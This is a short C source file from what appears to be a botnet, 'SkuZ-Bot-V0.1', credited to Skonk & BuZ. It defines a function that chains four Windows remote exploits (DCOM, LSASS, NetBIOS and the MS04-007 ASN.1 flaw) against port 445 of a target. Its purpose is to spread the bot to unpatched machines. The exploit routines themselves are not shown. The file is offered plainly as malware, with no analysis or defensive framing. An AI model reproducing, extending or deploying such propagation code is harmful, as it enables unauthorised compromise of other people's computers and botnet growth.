/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 
#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_LAND
#ifndef NO_NETBIOS
#ifndef NO_MS04007ASN1

BOOL land(EXINFO exinfo)
{
	exinfo.port = 445;
	BOOL bDCOM = dcom(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);
		exinfo.port = 445;
	BOOL bNETBIOS = NetBios(exinfo);
		exinfo.port = 445;
	BOOL bASN1SMB = MS04_007_MSASN1_PortedByScriptGod(exinfo);

	return bDCOM || bLSASS || bNETBIOS || bASN1SMB ? TRUE : FALSE;
}

#endif
#endif
#endif
#endif
#endif
/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 